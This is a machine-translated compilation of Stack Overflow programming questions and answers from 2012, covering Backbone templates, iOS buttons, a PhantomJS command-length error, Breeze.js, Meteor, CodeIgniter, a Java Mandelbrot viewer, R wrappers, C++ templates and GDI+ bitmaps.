[http://api.jquery.com/jQuery.template/](http://api.jquery.com/jQuery.template/)

似乎 require 是最好的方法，但也许我遗漏了一些东西，我确实不想让事情尽可能干净，因为我正处于学习/玩乐阶段：D

任何具有良好结构的好文章或 github 项目或对此有任何启示都将受到赞赏。

谢谢。

请原谅任何重大的拼写错误，而不是说英语的人:)

--EDIT-- 发现了一些有趣的视频来了解如何使用 require.js [http://www.youtube.com/watch?v=VGlDR1QiV3A开始和包装东西](http://www.youtube.com/watch?v=VGlDR1QiV3A)

[http://www.youtube.com/watch?v=M-wjQjsryMY](http://www.youtube.com/watch?v=M-wjQjsryMY)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T08:57:40.923

从您列出的那些中，Require 是一个不错的选择。

有没有你没有简单考虑过的原因：

1.  将模板存储在使用它们作为`<script type='text/template'>`节点的页面中？

2.  将模板存储为文本（非 JS）文件并通过 XHR 在使用它们的页面上加载它们？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T10:17:29.497

我建议将 require.js 与文本插件一起使用。将 html 模板作为字符串混合在 javascript 变量中是个坏主意，以及使用类似`<script type="text/template"></script>`.

Here is one very good series on backbone.js which covers template loading and project build as well: [http://dailyjs.com/2012/11/29/backbone-tutorial-1/](http://dailyjs.com/2012/11/29/backbone-tutorial-1/). Github project is also provided there.

# iphone - 如何保存对以编程方式添加的控件的引用？

> ID：14097537
> 
> 赞同：2
> 
> 时间：2012-12-31T04:45:37.180
> 
> 标签：iphone, objective-c, ios

我以编程方式在视图中添加了 3 个按钮，然后将这些按钮添加到数组中，以便以后可以访问它们：

```
for (i = 0; i < 3; i++)
{
  UIButton *button = [UIButton buttonWithType:UIButtonTypeCustom];
  [view addSubview:button];
  [_buttons addObject:button];
} 
```

如果我引用数组中的按钮并更改按钮的图像，它不会更改屏幕上的按钮。

```
UIButton* button = [_buttons objectAtIndex: 0];
[button setImage:thumb forState:UIControlStateNormal]; 
```

我找到了一种通过循环遍历视图中的所有子视图来更改按钮图像的方法，但是有更好的方法吗？

```
for (UIView* subView in ((UIView*)[self.view.subviews objectAtIndex:0]).subviews){
    if ([subView isKindOfClass:[UIButton class]]){
        UIButton *button = (UIButton*)subView;
        if (button.tag == self.selected){
            [button setImage:thumb forState:UIControlStateNormal];
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-31T04:55:59.457

一个常见的原因是您的数组尚未初始化。发生这种情况时，Objective C 不会抱怨或抛出异常：相反，它的行为就像从未发生过添加元素的调用一样。当您尝试取回物品时，它也会返回 nil。

将此行添加到您的 viewDidLoad 方法：

```
_buttons = [NSMutableArray array]; 
```

这应该可以解决问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T04:49:51.473

这可能有助于点击事件：

```
 -(void)clickEvent:(id)sender
      {
           [sender setImage:thumb forState:UIControlStateNormal];
      } 
```

如果这就是您接收事件的方式。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T04:55:18.253

当您执行 addSubview 时，视图会保留您正在添加的子视图。addObject 也保留它。因此两者都是不同的对象。更改数组中对象的属性不会影响视图保留的对象。您可以通过使用标签来避免循环。在视图上添加按钮时，会为其设置唯一标签。当你想访问它们时，直接使用标签获取它。

```
//set tags for buttons
      UIButton *button = [UIButton buttonWithType:UIButtonTypeCustom];
      [button setTag:999];
      [view addSubview:button];

//access using tag
      UIButton *button = (UIButton*)[view viewWithTag:999];
      [button setImage:thumb forState:UIControlStateNormal]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-31T04:57:00.637

创建按钮后为其添加标签。稍后使用该标签获取该按钮。

```
for (i = 0; i < 3; i++)
{
  UIButton *button = [UIButton buttonWithType:UIButtonTypeCustom];
  button.tag = i+1;
  [view addSubview:button];
  [_buttons addObject:button];
} 
```

然后你可以像这样访问它：

```
UIButton *button1 = (UIButton *)[self.view viewWithTag:1];
UIButton *button2 = (UIButton *)[self.view viewWithTag:2];
UIButton *button3 = (UIButton *)[self.view viewWithTag:3]; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-31T04:58:19.107

在添加`UIControl programatically`到`reference`稍后使用`add tag`时，它应该是`different`这样的：

```
 yourBtn.tag = 111; 
```

现在`reference`像这样获取 UIButton：

```
 UIButton *button = (UIButton*)[yourViewWhereYouAdded viewWithTag:111]; 
```

# c# - 从asp运行命令时如何解决“输入行太长”错误

> ID：14097541
> 
> 赞同：1
> 
> 时间：2012-12-31T04:46:15.387
> 
> 标签：c#, windows, shell

在我的应用程序中，我从 asp 脚本运行终端命令，该命令运行 PhantomJs 并给出一些参数并记录结果。不幸的是，因为我正在传递文件的路径，所以对于迟钝的 Windows 终端来说，整个命令变得太长了，我得到了`input line too long`错误。更奇怪的是，限制应该是 2/8k，而我只有大约 350 个字符。单个参数的长度是否也有限制？

这是我的代码示例命令：

```
System.Diagnostics.ProcessStartInfo phantomProcess = new System.Diagnostics.ProcessStartInfo();
phantomProcess.FileName = "cmd"; 
```

`string command = "/c \"phantomjs 'K:\\LAMP\\www\\2.x\\examples\\ASP.NET MVC2 demo\\ASP.NET MVC\\render.js' 'K:\\LAMP\\www\\2.x\\examples\\ASP.NET MVC2 demo\\ASP.NET MVC\\exportHtml-1570662045.html|K:\\LAMP\\www\\2.x\\examples\\ASP.NET MVC2 demo\\ASP.NET MVC\\exportHtml-1570642318.html|K:\\LAMP\\www\\2.x\\examples\\ASP.NET MVC2 demo\\ASP.NET MVC\\exportHtml-1570648254.html|K:\\LAMP\\www\\2.x\\examples\\ASP.NET MVC2 demo\\ASP.NET MVC\\exportHtml-1570696111.html|K:\\LAMP\\www\\2.x\\examples\\ASP.NET MVC2 demo\\ASP.NET MVC\\exportHtml-1570696111.html|K:\\LAMP\\www\\2.x\\examples\\ASP.NET MVC2 demo\\ASP.NET MVC\\exportHtml-1570669151.html|K:\\LAMP\\www\\2.x\\examples\\ASP.NET MVC2 demo\\ASP.NET MVC\\exportHtml-1570669151.html|K:\\LAMP\\www\\2.x\\examples\\ASP.NET MVC2 demo\\ASP.NET MVC\\exportHtml-1570678096.html'\"";`

```
phantomProcess.Arguments = command;
System.IO.StreamReader sOut = proc.StandardOutput;
phantomOut = sOut.ReadToEnd().Trim();
proc.WaitForExit();
sOut.Close(); 
```

有没有办法解决这个错误，一些特定于 Windows 的技巧？我见过一些使用环境变量的解决方案，但是将长字符串分配给变量看起来以同样的方式被破坏。如果标签错误，请纠正我。

* * *

编辑

我从 MS 那里找到了一些关于这个“功能”的信息：http: [//support.microsoft.com/kb/830473](http://support.microsoft.com/kb/830473)。他们建议将参数放入一个文本文件，然后将此文件名作为参数传递来运行所需的应用程序。我已经尝试过这种方法，但是在我这样运行它之后，整个终端看起来都冻结了。

# asp.net-mvc - 使用breeze js不直接与DBContext交互

> ID：14097543
> 
> 赞同：4
> 
> 时间：2012-12-31T04:47:32.753
> 
> 标签：asp.net-mvc, breeze, singlepage

我对微风很陌生，有几个问题。

我认为微风js有很好的功能，所以我可以替换我自己的数据上下文。但是，我不想让微风直接与 dbcontext 层交互。事实上，在我的应用程序中，Service 层只向 Controller 公开 ViewModel——甚至没有真正的业务模型。所以我不太确定我是否可以使用 Breeze，因为在少数 Breeze 的示例中，我只看到 Breeze 直接与 DBContext 交互。

谢谢。

==========================================

感谢沃德的回答，

关于我喜欢 Breeze 的特性，它有助于减少大量时间来构建我自己的客户端视图模型。而要构建一个 SPA，维护客户端视图模型对我来说真的很痛苦，尤其是我的应用程序有桌面应用程序客户端和其他手持设备的应用程序。此外，为了处理从 JSon 对象到 Knockout 的映射——这意味着对于每个视图模型，我还需要一个映射器。

目前，我的架构是这样的：

服务器端：存储层 <=> 服务层 <=> 控制器（带有暴露给客户端的 Web API）

控制器只能通过 Service 发送请求来获取数据（以 View Model 的格式）。

所以，我的问题是是否可以利用 Breeze 进行查询以及它与淘汰赛的集成。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T07:34:14.430

Breeze 从不直接与您的 DbContext 一起工作；它适用于您通过服务上的端点公开的服务模型（例如，Web API 控制器方法）。但是，当客户端可以查询和保存与服务器上的实体结构相同的实体时，您肯定会从 Breeze 中获得最大的价值。

您可以使用 Breeze 检索 ViewModel - 您可以使用 Breeze 调用几乎任何 HTTP 服务方法。我不清楚 Breeze 在您检索到它们后如何帮助您管理客户端上的这些 ViewModel。

Breeze 的哪些功能在您看来“*非常好*”？您对该问题的回答将帮助您确定 Breeze 是否有助于您首选的建筑风格。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T08:23:03.307

在没有 API 控制器的情况下直接使用 DBContext 通过 Breeze 查询数据应该没问题，保存可能更难但仍然可以管理。我认为最复杂的部分是向客户端获取元数据。

根据[这个 SO answer](https://stackoverflow.com/a/15506288/19712)，用于从其他来源公开元数据的示例 DBContext 应该在一周左右的时间内直接发布。

同时，检查[BreezeJS spa-template 示例](http://www.breezejs.com/spa-template#server)，因为服务器端涉及存储库模式，这使其类似于您的数据访问设置。

# javascript - 在调试流星客户端时，如何查看集合或光标内容？

> ID：14097547
> 
> 赞同：6
> 
> 时间：2012-12-31T04:48:02.720
> 
> 标签：javascript, meteor

我正在尝试调试[流星应用程序](http://meteor.com)的客户端。如何查看集合的内容？更具体地说，如何`LocalCollection.Cursor`像在控制台中查看普通对象一样查看 a 的内容？

在服务器端，`db.collectionName.find()`将输出 JSON`db.collectionName.find().pretty()`并使集合的内容易于阅读和检查。我将如何在客户端使用“minimongo”集合做类似的事情？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-31T05:11:49.540

您可以`Collection.find({}).fetch()`查看集合中的对象数组。然后，您可以展开每个对象以查看其属性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-30T12:17:52.717

没错，还有另一种方法，
这就是我正在做的 MyCollection.find({});
在控制台中，我以这种方式
收集-> docs-> {{your-data-here}}。

# php - 遇到 PHP 错误

> ID：14097550
> 
> 赞同：-1
> 
> 时间：2012-12-31T04:48:12.657
> 
> 标签：php, codeigniter

```
// Severity: Notice  Message: Use of undefined constant errors - assumed 'errors'         Filename: views/register_user.php  Line Number: 8 

//I get an error(above) after I register but the good news is it displays validation errors().

//users.php
$this->load->library('form_validation');
    $this->form_validation->set_rules($config);     
    if($this->form_validation->run() == FALSE){
         $data['errors']=validation_errors();   
    }
//register_user.php
<?php if($errors = validation_errors()){ 
echo $errors; ?>
<div style="background:red;color:white;">
<?=errors?>
</div>
<? } ?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T04:50:39.380

你犯了一个语法错误..在错误变量之前错过了 $..

尝试这个

```
$this->load->library('form_validation');
    $this->form_validation->set_rules($config);     
    if($this->form_validation->run() == FALSE){
         $data['errors']=validation_errors();   
    }
//register_user.php
<?php if($errors == validation_errors()){ 
echo $errors; ?>
<div style="background:red;color:white;">
<?=$errors?>
</div>
<? } ?> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-31T04:51:10.193

`<?=errors?>`是不正确的。

尝试在前面放一个 $ 符号，让 PHP 知道它是一个变量，而不是常量：

```
<?=$errors?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T04:49:29.157

将代码更改为以下

```
<?php 
$errors = validation_errors();
if($errors){ 
 ?>
<div style="background:red;color:white;">
<?=$errors?>
</div>
<? } ?> 
```

# ios - 您如何以编程方式访问 iPhone 上的通话音量？

> ID：14097552
> 
> 赞同：2
> 
> 时间：2012-12-31T04:49:00.617
> 
> 标签：ios, volume, mpvolumeview

目前，改变通话音量的唯一方法是使用手机侧面的音量按钮。我觉得在通话时不得不摆弄这些按钮很烦人。我正在尝试制作一些可以让您提前设置单个呼叫者的音量的东西。我尝试在 IB 中添加一些按钮来访问音乐播放器的音量属性，但这只会影响音乐音量级别。现在，我实现了一个 MPVolumeView，但这似乎也只控制音乐音量。我的印象是有一种叫做系统音量的东西，其中包括通话音量，MPVolumeView 可以让你操纵。但显然它只是为了音乐音量。有没有办法以编程方式访问和控制通话量（可能使用 MPVolumeView）？

# java - 如何检测包名冲突

> ID：14097554
> 
> 赞同：1
> 
> 时间：2012-12-31T04:49:28.067
> 
> 标签：java, android, eclipse

我收到可怕的“转换为 Dalvik 格式失败，错误 1”。我 [在 external JAR 上看到了线程“Conversion to Dalvik format failed with error 1”](https://stackoverflow.com/questions/2680827/conversion-to-dalvik-format-failed-with-error-1-on-external-jar)。

我的问题是如何检测我的项目中是否存在包名冲突。这是一个大型项目，因此可能无法手动完成或需要太多时间。

另外，有没有办法确定一个 jar 是否包含在项目中多次？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T05:00:53.677

> 我的问题是如何检测我的项目中是否存在包名冲突。

冒着给出愚蠢答案的风险，最简单的方法是尝试转换为 Dalvik 格式。这将告诉您是否存在冲突。修复它...然后重复该过程。（问题是具有相同完全限定名称的多个类......不是包名冲突。）

> 此外，有没有办法确定一个 jar 是否包含在项目中多次。

我原以为对构建路径进行目视检查就足够了。

* * *

我不知道有什么特殊的工具可以做这些事情，但我不相信你需要特殊的工具。即使是一个复杂的项目。

# java - 在 Java 中放大 Mandelbrot 集分形

> ID：14097559
> 
> 赞同：5
> 
> 时间：2012-12-31T04:50:11.300
> 
> 标签：java, zooming, fractals, mandelbrot

我开始制作曼德布罗集分形查看器。在放大分形时，我遇到了很多问题。如果您尝试缩放，查看器只会靠近中心。我已经尽我所能来理解这个困境。我怎样才能放大我的分形，当我放大时，它会放大屏幕的中心，而不是分形的中心？

```
import java.awt.*;
import java.awt.image.BufferedImage;
import javax.swing.*;
import java.awt.event.*;

public class Mandelbrot extends JFrame implements ActionListener {

    private JPanel ctrlPanel;
    private JPanel btnPanel;
    private int numIter = 50;
    private double zoom = 130;
    private double zoomIncrease = 100;
    private int colorIter = 20;
    private BufferedImage I;
    private double zx, zy, cx, cy, temp;
    private int xMove, yMove = 0;
    private JButton[] ctrlBtns = new JButton[9];
    private Color themeColor = new Color(150,180,200);

    public Mandelbrot() {
        super("Mandelbrot Set");
        setBounds(100, 100, 800, 600);
        setResizable(false);
        setDefaultCloseOperation(EXIT_ON_CLOSE);
        plotPoints();

        Container contentPane = getContentPane();

        contentPane.setLayout(null);

        ctrlPanel = new JPanel();
        ctrlPanel.setBounds(600,0,200,600);
        ctrlPanel.setBackground(themeColor);
        ctrlPanel.setLayout(null);

        btnPanel = new JPanel();
        btnPanel.setBounds(0,200,200,200);
        btnPanel.setLayout(new GridLayout(3,3));
        btnPanel.setBackground(themeColor);

        ctrlBtns[1] = new JButton("up");
        ctrlBtns[7] = new JButton("down");
        ctrlBtns[3] = new JButton ("left");
        ctrlBtns[5] = new JButton("right");
        ctrlBtns[2] = new JButton("+");
        ctrlBtns[0] = new JButton("-");
        ctrlBtns[8] = new JButton(">");
        ctrlBtns[6] = new JButton("<");
        ctrlBtns[4] = new JButton();

        contentPane.add(ctrlPanel);
        contentPane.add(new imgPanel());
        ctrlPanel.add(btnPanel);

        for (int x = 0; x<ctrlBtns.length;x++){
            btnPanel.add(ctrlBtns[x]);
            ctrlBtns[x].addActionListener(this);
        }

        validate();

    }

    public class imgPanel extends JPanel{
        public imgPanel(){
            setBounds(0,0,600,600);

        }

        @Override
        public void paint (Graphics g){
            super.paint(g);
            g.drawImage(I, 0, 0, this);
        }
    }

    public void plotPoints(){
        I = new BufferedImage(getWidth(), getHeight(), BufferedImage.TYPE_INT_RGB);
        for (int y = 0; y < getHeight(); y++) {
            for (int x = 0; x < getWidth(); x++) {
                zx = zy = 0;
                cx = (x - 320+xMove) / zoom;
                cy = (y - 290+yMove) / zoom;
                int iter = numIter;
                while (zx * zx + zy * zy < 4 && iter > 0) {
                    temp = zx * zx - zy * zy + cx;
                    zy = 2 * zx * zy + cy;
                    zx = temp;
                    iter--;
                }
                I.setRGB(x, y, iter | (iter << colorIter));
            }
        }
    }

    public void actionPerformed(ActionEvent ae){
        String event = ae.getActionCommand();

        switch (event){
        case "up":
            yMove-=100;
            break;
        case "down":
            yMove+=100;
            break;
        case "left":
            xMove-=100;
            break;
        case "right":
            xMove+=100;
            break;
        case "+":
            zoom+=zoomIncrease;
            zoomIncrease+=100;
            break;
        case "-":
            zoom-=zoomIncrease;
            zoomIncrease-=100;
            break;
        case ">":
            colorIter++;
            break;
        case "<":
            colorIter--;
            break;
        }

        plotPoints();
        validate();
        repaint();
    }

    public static void main(String[] args) {
        new Mandelbrot().setVisible(true);
    }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-31T15:57:26.027

Mandelbrot 集存在于具有自然坐标的数学平面中。您使用 BufferedImage 我使用“视口”坐标“查看”它。这一切都在这些之间的映射中。您已将视口坐标标记为 x 和 y，将 Mandelbrot 空间中的“真实”坐标标记为 cx 和 cy。这些是公式：

```
 cx = (x - 320+xMove) / zoom;
        cy = (y - 290+yMove) / zoom; 
```

为了放大和缩小特定的“真实”点，您希望位移量在缩放时保持不变。问题是位移量被缩放量缩放。记住 cx 和 cy 是 Mandelbrot 平面中的真实坐标，x & y 是视口坐标。因此，当查看视口的中间时，当您更改缩放时，您希望 cx 和 cy 保持不变。

我的猜测是你想要类似的东西：

```
 cx = ((x - 320) / zoom) + xMove;
    cy = ((y - 290) / zoom) + yMove; 
```

这将使 Mandelbrot 平面中的“运动”保持独立于缩放量。我假设 320 和 290 与视口大小有关，并在视口中间给你一个零。

您将希望 xMove 和 yMove在击键时*更改*的量不是固定量 (100)，而是取决于缩放级别的量。当您放大很多时，您希望真实 Mandelbrot 平面中的移动量在每次击键时变小。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-02T02:47:19.467

每次放大时，我都能通过额外的水平或垂直移位来解决这个问题。

因此，而不是：

```
case "+": //zooming in
zoom+=zoomIncrease;
zoomIncrease+=100;
break; 
```

我现在有

```
case "+":
initialZoom = zoom;
zoom+=zoomIncrease;
zoomIncrease*=2;
xMove*=2;
yMove*=2;
break; 
```

这基本上通过将其在 x 和 y 轴上的移动乘以缩放增加的因子（即 2）来重新定位已绘制的图像。

# r - 使用现有函数编写函数

> ID：14097562
> 
> 赞同：1
> 
> 时间：2012-12-31T04:50:45.937
> 
> 标签：r

> **可能重复：**
> [如何通过 R 中的包装函数传递函数及其参数？类似于 python 中的 *args 和 *kwargs](https://stackoverflow.com/questions/8165837/how-to-pass-a-function-and-its-arguments-through-a-wrapper-function-in-r-simila)

我正在尝试使用现有函数编写一个函数，并且能够将参数传递给现有函数，而无需在新函数中定义每个参数。这很难用语言来表达。所以这是一个例子：我正在使用 read.table 编写一个函数，以便使用我正在编写的函数定义必须读取的文件名（基本上我不想更改工作目录）。以下是示例：

```
MyFilePath <- "/Users/John/Work/"

  read.table.path <- function(file, path){
   x <- paste(path, file, sep="/")
   return(read.table(x))
  } 
```

因此，要读取该文件夹中名为“table.txt”的文件：

```
table <- read.table.path(file="table.txt", path=MyFilePath) 
```

但是，我如何使用此函数 ( `read.table.path`) 以便将参数传递给`read.table`，例如，如果我想说`header=TRUE`、`fill=TRUE`等。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-31T04:56:38.033

采用`...`

```
read.table.path <- function(file, path,...){
  read.table(file.path(path, file), ...)    
} 
```

（该`file.path`函数比 快`paste`，并填充适当的平台特定路径分隔符）。

您描述的那种小功能通常称为“包装器”。

# c++ - 将 T 类型的多态包装器转换为 U 类型？

> ID：14097572
> 
> 赞同：1
> 
> 时间：2012-12-31T04:52:55.810
> 
> 标签：c++, templates, types, c++11, polymorphism

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T16:20:01.797

Is this what you want?

```
struct Base
{
  virtual void* convert(const std::type_info&) = 0;
};

template<typename T>
struct Derived : Base
{
  virtual void* convert(const std::type_info& ti)
  { return typeid(T) == ti ? &t : nullptr; }

  T t;
};

struct Any
{
  Base* b;

  template<typename U>
    operator U()
    {
      if (auto p = b->convert(typeid(U)))
        return *static_cast<U*>(p);
      throw std::exception();
    }
}; 
```

As the other answer says, it's hard to know exactly what you want as you've only shown invalid code, not explained what you're trying to achieve.

**Edit** oh I see now you want it to work for any convertible type, not just exact matches ... then no, you can't turn a `type_info` back into the type it represents, which would be needed for the derived type to test if the given `type_info` corresponded to a type that its stored type is convertible to. You need to know the correct type and specify it *somehow*, either explicitly or implicitly via deduction. If you then want to convert it to another type, you can do that separately:

```
Any a{ new Derived<int>() };
try {
  char c = a;  // throws
}
catch (...)
{
}
int i = a;        // OK
char c = (int)a;  // OK 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-31T10:35:52.813

Based on your update I think that this is what you are trying to do.

```
#include <typeinfo>
#include <exception>
#include <string>

template <typename T>
struct Any{
        T* t;
        Any():t(NULL){}
        Any(const T& _t){
                t=new T(_t);
        }
        template<typename U>
        operator U(){
                if(typeid(T)!=typeid(U) || t==NULL)
                        throw std::exception();
                return *t;
        }
};

int main (){
        Any<std::string> a(std::string("Nothing"));
        std::string b=a;
        return 0;
}; 
```

If this doesn't help please explain in text not code what you are trying to achieve. It'll be useful to tell us also why you want to use those two extra classes Base and Derived.

# c# - 位图区域已锁定异常

> ID：14097574
> 
> 赞同：2
> 
> 时间：2012-12-31T04:53:01.037
> 
> 标签：c#, visual-studio-2010, image, visual-studio, colors

我正在使用这段代码：

```
internal static Image ColorReplacer(Image Img, Color oldcolor, Color newcolor, int tolerence)
        {
            // Gotten From -> Code Project
            Bitmap bmap = (Bitmap)Img.Clone();
            Color c;
            int iR_Min, iR_Max; int iG_Min, iG_Max; int iB_Min, iB_Max;
            //Defining Tolerance
            //R
            iR_Min = Math.Max((int)oldcolor.R - tolerence, 0);
            iR_Max = Math.Min((int)oldcolor.R + tolerence, 255);
            //G
            iG_Min = Math.Max((int)oldcolor.G - tolerence, 0);
            iG_Max = Math.Min((int)oldcolor.G + tolerence, 255);
            //B
            iB_Min = Math.Max((int)oldcolor.B - tolerence, 0);
            iB_Max = Math.Min((int)oldcolor.B + tolerence, 255);

            for (int x = 0; x < bmap.Width; x++)
            {
                for (int y = 0; y < bmap.Height; y++)
                {
                    c = bmap.GetPixel(x, y);
                    //Determinig Color Match
                    if ((c.R >= iR_Min && c.R <= iR_Max) &&
                        (c.G >= iG_Min && c.G <= iG_Max) &&
                        (c.B >= iB_Min && c.B <= iB_Max)
                       )
                        if (newcolor == Color.Transparent)
                            bmap.SetPixel(x, y, Color.FromArgb(0, newcolor.R, newcolor.G, newcolor.B));
                        else
                            bmap.SetPixel(x, y, Color.FromArgb(c.A, newcolor.R, newcolor.G, newcolor.B));
                }
            }
            return (Image)bmap.Clone();
        } 
```

这段代码工作得很好。它成功地将我的白色图标图像更改为另一种颜色。问题是：一旦我改变它，我就不能再改变它了。它给了我“位图区域已锁定异常”。我假设这是因为 GetPixel() 正在锁定图像？

任何人都可以提出一个很好的解决这个问题的方法吗？

PS：我知道 GetPixel() 是一个非常慢的方法，但是，我使用的是 8 张图片，它们都是 24px。它们非常小，所以我不认为 GetPixel() 的性能有那么大的问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:16:23.763

我刚刚测试了您的代码，并且它正确执行（即，我能够在每次使用不同颜色的单个图像上多次调用 ColorReplacer，然后将其绘制到表单上）。

您能否提供您正在使用的调用 ColorReplacer 方法的代码示例？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T05:27:22.277

您需要按照以下过程通过锁定和解锁图像数据来更改颜色：

[http://msdn.microsoft.com/en-us/library/system.drawing.bitmap.unlockbits.aspx](http://msdn.microsoft.com/en-us/library/system.drawing.bitmap.unlockbits.aspx)

# jquery - 如何定位当前页面的导航元素并使用 jQuery 淡出其 css“当前”类？

> ID：14097577
> 
> 赞同：1
> 
> 时间：2012-12-31T04:53:06.123
> 
> 标签：jquery, css, hover, fade, nav

我有一个简单的导航栏。正如您所期望的，与当前页面对应的链接上有一个名为“current”的简单 CSS 类。所有链接都有一个很好的悬停过渡效果，“ease-in-out”属性持续 0.3 秒。问题是，当用户点击导航栏上的不同链接时，他不会看到缓出效果，因为页面会立即切换。我知道我可以使用 setTimeout() 函数通过 jQuery 延迟页面切换，但我不太明白如何在链接元素上定位“当前”类并告诉浏览器慢慢淡出“当前”CSS在切换到下一页之前上课。

这有意义吗？当前的 HTML：

```
<nav>
<ul>
<li><a href="#" class="current">About</a></li>
<li><a href="work.html">Work</a></li>
<li><a href="contact.html">Contact</a></li>
</ul>
</nav> 
```

超级简单的导航，当前页面有一个 CSS 类 hover 类，它在基本链接样式之后定义为：

```
nav ul li a, nav ul li a:link, nav ul li a:visited{
    font-family: Arial, Verdana, sans-serif;
    text-decoration: none;
    color: rgba(0,0,0,1);
    font-size: 2.4em;
    padding: 5px 10px;
    margin: 0px 15px;
   -webkit-text-shadow: 1px 1px 1px rgba(255,255,255,1);
   -moz-text-shadow: 1px 1px 1px rgba(255,255,255,1);
   text-shadow: 1px 1px 1px rgba(255,255,255,1);
   -webkit-transition: all 0.3s ease-in-out;
   -moz-transition: all 0.3s ease-in-out;
   transition: all 0.3s ease-in-out;
}

nav ul li a:hover, nav ul li a:active, nav ul li a.current{
    color: rgba(255,255,255,1);
    background: rgba(0,0,0,1);
    text-decoration: none;
    -moz-border-radius: 140px;
    -webkit-border-radius: 140px;
    border-radius: 140px;
    -webkit-text-shadow: 1px 1px 1px rgba(0,0,0,.5);
    -moz-text-shadow: 1px 1px 1px rgba(0,0,0,.5);
    text-shadow: 1px 1px 1px rgba(0,0,0,.5);
} 
```

无论如何，我都在使用 jQuery 来处理站点中的其他内容，因此 jQuery 的答案是完全可以接受的。我希望我对我的问题足够清楚。基本上，当用户单击不同的导航链接时，我不希望用户突然切换页面。我希望“当前”CSS 类在浏览器转到新页面之前淡出 0.3 秒。我知道我对 CSS“当前”类和链接悬停状态应用了相同的样式，如果这是代码工作所需要的，我可以更改它。

提前感谢任何提供帮助的人。任何建议/建议/提示表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:20:00.967

您不能淡出课程本身。您可以创建一个通过添加或删除一个类来触发的 CSS3 过渡，并将创建所需的动画、淡入淡出或其他任何东西。

因此，例如，您可以为`opacity`属性设置 CSS3 过渡。您的 CSS 中的`.current`类可以指定`opacity: 1`，默认 CSS 条件（没有`.current`类时）可以是 for `opacity: 0;`。然后，当您`current`从对象中移除该类时，该项目将逐渐淡出至 0 不透明度。

或者，您可以有一个`fadeOut`具有`opacity: 0`CSS 规则的类，并`opacity`在对象上设置 CSS 过渡，您只需将该`fadeOut`类添加到对象。

听起来您已经知道，如果链接单击要更改页面，那么您必须延迟链接 href 的处理，`setTimeout()`以便能够看到淡入淡出过渡并可能阻止默认处理链接。

# c++ - C++ 模板 - 成员函数的部分特化

> ID：14097580
> 
> 赞同：3
> 
> 时间：2012-12-31T04:53:42.673
> 
> 标签：c++, class, templates, inheritance, specialization

我正在尝试根据模板参数指定的 2D 或 3D 专门化一些几何函数。如果我为问题的玩具版本包含一些（非常损坏的）代码，则最好：

```
template <typename T, int d>
class Point
{
public:
    int x;
    int y;
    int z;

    T add ()
    {
        return T(0);
    }

    template <>
    T add <T, 2> ()
    {
        return x + y;
    }

    template <>
    T add <T, 3> ()
    {
        return x + y + z;
    }
}; 
```

这段代码编译失败。我已经尝试了很多不同的模板参数格式和类定义的组合，但找不到一种方法来对 'd' 进行函数专业化，同时保留 'T' 通用。

在我的实际解决方案中，我试图计算梯度、曲率、插值等，专门用于 2D 或 3D 情况。有些事情，比如梯度计算，可以简单地使用 'd' 参数来限制 for 循环迭代。其他的，如插值，需要单独的 2D 和 3D 函数。

非常感谢任何提示！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-31T05:22:37.570

我会建议这个解决方案：

```
template <typename T, int d> 
class Point : public Point<T, d-1>
{
   typedef Point<T, d-1> base;
   T m_value;
public:
    T add()
    {
        return m_value + base::add();
    }   

    //another method which returns you the point value
    template<int N>
    T get()
    {
       return N==d ? m_value : base::get<N>();
    }
};

template <typename T>
class Point<T,0>
{
protected:
    T add()
    {
        return T(); //default value which is zero for all builtin types
    }
    template<int N>
    T get() { return T(); }

}; 
```

使用此解决方案，您可以拥有任意多的点，但大于`zero`.

```
Point<int,1> p1;  //contains 1 point
Point<int,2> p2;  //contains 2 points
Point<int,3> p3;  //contains 3 points
Point<int,4> p4;  //contains 4 points
Point<int,5> p5;  //contains 5 points

auto x1 = p5.get<1>(); //get first point
auto x3 = p5.get<3>(); //get third point
auto x4 = p5.get<4>(); //get fourth point 
```

或者为了方便起见，使用这些 typedef：

```
typedef Point<int,2> Point2D;
typedef Point<int,3> Point3D;

//then use them
Point2D p2d;
Point3D p3d; 
```

嗯，这只是一个可以进一步增强的基本概念，支持许多有用的功能。我只是写`get<>`来演示一个似乎有用的功能。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-31T05:16:07.087

这是您的示例的工作方式。您首先声明您的主模板：

```
template <typename T, int d> class Point; 
```

无需定义它，因为您没有通用实现。

接下来，您为不同数量的维度创建偏特化，但您的偏特化仍将类型 T 作为模板参数：

```
template <typename T>
class Point<T,2>
{
public:
    T x;
    T y;

    T add()
    {
        return x + y;
    }
};

template <typename T>
class Point<T,3>
{
public:
    T x;
    T y;
    T z;

    T add()
    {
        return x + y + z;
    }
}; 
```

# android - Get a contact's groups?

> ID：14097582
> 
> 赞同：12
> 
> 时间：2012-12-31T04:54:05.093
> 
> 标签：android

I'm trying to make a many-to-many mapping of contacts to groups.

For example, if I have:

*   User 1, belongs to group 701, 702, 704
*   User 2, belongs to no groups
*   User 3, belongs to group 702

I'm hoping to get a relation that looks like this:

```
userID | groupID
1      | 701
